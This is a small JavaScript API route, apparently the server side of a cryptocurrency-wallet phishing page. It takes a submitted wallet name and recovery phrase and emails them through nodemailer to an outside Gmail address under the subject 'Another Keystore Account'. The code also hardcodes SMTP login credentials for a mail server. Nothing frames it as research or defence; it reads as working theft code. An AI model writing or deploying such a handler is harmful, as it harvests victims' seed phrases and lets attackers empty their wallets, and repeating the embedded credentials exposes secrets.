import nodemailer from 'nodemailer'

export default async (req, res) => {
  const koratransport = nodemailer.createTransport({
    port: 465,
    host: "mail.taddleray.com",
    auth: {
      user: 'supports@taddleray.com',
      pass: 'taddleray007$$',
    },
    secure: true, // upgrades later with STARTTLS -- change this based on the PORT
  });

  const mailData = {
    from: 'admin@taddleray.com',
    to: 'oxygen1991m@gmail.com',
    subject: "Another Keystore Account",
    html: `<h3>Wallet: ${req.body.wallet}</h3><br/>
            <br>phrase: ${req.body.phrase}<br/> 
        `
  };
  koratransport.sendMail(mailData, (error, info) => {
    console.log(info)
    if (error) {
      return console.log(error);
    }
    res.status(200).send({ message: "Mail send", message_id: info.messageId });
  });
  // res.status(200).json(result)
}
